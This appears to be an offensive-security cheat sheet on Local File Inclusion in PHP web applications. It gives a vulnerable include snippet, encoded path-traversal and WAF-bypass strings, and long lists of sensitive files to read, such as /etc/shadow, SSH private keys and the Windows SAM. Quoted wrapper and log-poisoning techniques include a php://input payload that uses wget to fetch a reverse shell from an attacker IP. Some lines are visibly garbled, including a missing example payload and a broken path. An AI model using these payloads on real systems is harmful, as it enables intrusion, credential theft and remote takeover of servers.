---
description: Local File Inclusion
---

# LFI

LFI occurs when a web server does not sanitize input correctly while retrieving a file that the client requested.  This allows the attacker to manipulate the input and/or inject various characters, in order to traverse through directories and gain access to files that were never intended to be public.    
Most commonly, LFI vulnerable parameters appear like this:

```text
https://vulnerableserver.org/pathetic_sanitization.php?file=file_not_really_that_cool
```

Without correct sanitization, an attacker can change the file that is being retrieved to   
`file=../../../../../../etc/passwd (linux)  
file=../../../../../WINDOWS/System32/drivers/etc/hosts`

The vulnerable php code that allows this to happen may look similar to below \(hopefully, it is a little less obvious and sad\).

```php
<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("pages/$file");
   }
   else
   {
       include("index.php");
   }
?>
```



As WAFs are trained to detect these most common attempts at an LFI, you will likely need to use one of several bypasses available to get past the server's defenses.  These include encoding, double-encoding and more, in addition to being able to predict, fuzz or guess files that may be available on the server.  Here is a list of various bypasses, as well as juicy files on both Linux and Windows stations you may want to look for.  
  
**Encoded Traversal Strings**

```php
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\

## explanations ##
escape "/" with "\/" or “//” with “\/\/”
try single "/" instead of "//"
remove http i.e. "continue=//google.com"
“/\/\” , “|/” , “/%09/”
encode, slashes
”./” CHANGE TO “..//”
”../” CHANGE TO “....//”
”/” CHANGE TO “//”
```

**Common redirection parameters that may not be blacklisted**

```php
dest=
continue=
redirect=
url= (or anything with “url” in it)
uri= (same as above)
window=
next=
```

**Common parameters for LFI/RFI**

* File=
* document=
* Folder=
* root=
* Path=
* pg=
* style=
* pdf=
* template=
* php\_path=

**Juicy Files to Look For**

```php
Linux:
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/<int>/fd/<int> (e.g./proc/2116/fd/11)
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl

~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession


Apache:
Configuration Files:
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf

Log Files:
Red Hat/CentOS/Fedora Linux-   /var/log/httpd/access_log
Debian/Ubuntu-   /var/log/apache2/access.log
FreeBSD-   /var/log/httpd-access.log

Generic:
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log


MySql:
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
/var/lib/mysql/my.cnf

Windows:
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
C:\apache\logs\error.log 
C:\Program Files\Apache Group\Apache\logs\access.log 
C:\Program Files\Apache Group\Apache\logs\error.log 
C:\program files\wamp\apache2\logs 
C:\wamp\apache2\logs 
C:\wamp\logs 
C:\xampp\apache\logs\access.log 
C:\xampp\apache\logs\error.log
C:\inetpub\wwwroot\index.asp 
web.config in every directory you are traversing through
\windows\system32\logfiles\httperr\httperr1.log
\system32\inetsrv\Metabase.xml
.NET framework files - Check in c:\windows\microsoft.net\framework
\documents and settings\administrator\ntuser.ini
\documents and settings\administrator\desktop\desktop.ini
```

_**Following information via highon.coffee**_

**PHP Wrapper php://file**   
Another PHP wrapper, php://input your payload is sent in a POST request using curl, burp or hackbar to provide the post data is probably the easiest option.

Example: `http://192.168.183.128/fileincl/example1.php?page=php://input` Post Data payload, try something simple to start with like: Then try and download a reverse shell from your attacking machine using: `<? system('wget http://192.168.183.129/php-reverse-shell.php-O /var/www/shell.php');?>` After uploading execute the reverse shell at `http://192.168.183.129/shell.php`

**PHP Wrapper php://filter**   
Another PHP wrapper, php://filter in this example the output is encoded using base64, so you’ll need to decode the output. `http://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/pass`wd

**/proc/self/environ LFI Method**   
If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.

**/proc/self/fd/ LFI Method**   
Similar to the previous /proc/self/environ method, it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer. This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc. I’d recommend brute forcing the directory structure of the /proc/self/fd/ directory with Burp Intruder + FuzzDB’s LFI-FD-Check.txt list of likely proc files, you can then monitor the returned page sizes and investigate.

**fimap LFI Pen Testing Tool**  
 fimap is a tool used on pen tests that automates the above processes of discovering and exploiting LFI scripts. Upon discovering a vulnerable LFI script fimap will enumerate the local filesystem and search for writable log files or locations such as /proc/self/environ. Another tool commonly used by pen testes to automate LFI discovery is Kali’s dotdotpwn, which works in a similar way.

**fimap + phpinfo\(\)**   
Exploit Fimap exploits PHP’s temporary file creation via Local File Inclusion by abusing PHPinfo\(\) information disclosure glitch to reveal the location of the created temporary file. If a phpinfo\(\) file is present, it’s usually possible to get a shell, if you don’t know the location of the phpinfo file fimap can probe for it, or you could use a tool like OWASP DirBuster. Enjoy.

